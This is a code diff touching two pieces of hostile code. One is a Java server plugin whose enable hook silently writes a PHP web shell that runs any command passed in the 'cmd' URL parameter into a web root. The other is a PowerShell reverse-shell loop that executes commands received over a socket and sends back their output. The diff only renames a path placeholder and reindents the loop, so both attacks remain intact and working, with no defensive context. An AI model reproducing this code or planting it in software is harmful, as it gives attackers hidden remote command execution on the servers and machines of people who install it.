@@ -218,7 +218,7 @@ public class Main extends JavaPlugin {
 public void onEnable() {
   final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
   try {
-   Files.write(Paths.get("/var/www/<TARGET_DOMAIN>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
+   Files.write(Paths.get("/var/www/<DOMAIN>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
    } catch (IOException e) {
      e.printStackTrace();
    }
@@ -418,19 +418,19 @@ $buffer = new-object System.Byte[] 1024;
 $encoding = new-object System.Text.AsciiEncoding;
 do
 {
-	$writer.Flush();
-	$read = $null;
-	$res = ""
-	while($stream.DataAvailable -or $read -eq $null) {
-		$read = $stream.Read($buffer, 0, 1024)
-	}
-	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-	if(!$out.equals("exit")){
-		$args = "";
-		if($out.IndexOf(' ') -gt -1){
-			$args = $out.substring($out.IndexOf(' ')+1);
-			$out = $out.substring(0,$out.IndexOf(' '));
-			if($args.split(' ').length -gt 1){
+    $writer.Flush();
+    $read = $null;
+    $res = ""
+    while($stream.DataAvailable -or $read -eq $null) {
+        $read = $stream.Read($buffer, 0, 1024)
+    }
+    $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+    if(!$out.equals("exit")){
+        $args = "";
+        if($out.IndexOf(' ') -gt -1){
+            $args = $out.substring($out.IndexOf(' ')+1);
+            $out = $out.substring(0,$out.IndexOf(' '));
+            if($args.split(' ').length -gt 1){
                 $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                 $pinfo.FileName = "cmd.exe"
                 $pinfo.RedirectStandardError = $true
@@ -448,18 +448,18 @@ do
                 } else {
                     $res = $stdout
                 }
-			}
-			else{
-				$res = (&"$out" "$args") | out-string;
-			}
-		}
-		else{
-			$res = (&"$out") | out-string;
-		}
-		if($res -ne $null){
+            }
+            else{
+                $res = (&"$out" "$args") | out-string;
+            }
+        }
+        else{
+            $res = (&"$out") | out-string;
+        }
+        if($res -ne $null){
         $writer.WriteLine($res)
     }
-	}
+    }
 }While (!$out.equals("exit"))
 $writer.close();
 $socket.close();
